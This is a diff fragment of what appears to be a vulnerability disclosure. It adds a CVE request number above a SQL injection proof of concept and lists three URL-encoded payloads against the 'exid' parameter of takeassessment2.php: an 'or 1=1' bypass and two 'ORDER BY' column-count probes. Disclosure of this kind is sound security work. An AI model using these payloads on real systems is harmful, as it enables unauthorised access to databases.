@@ -77,8 +77,8 @@ ___
 
 # SQL 
 
+## CVE Request 1928480
 Poc:
-
 - /takeassessment2.php?exid=6%27%20or%201=1--%20-
 - /takeassessment2.php?exid=6%27%20ORDER%20BY%201--%20-
 - /takeassessment2.php?exid=6%27%20ORDER%20BY%207--%20-
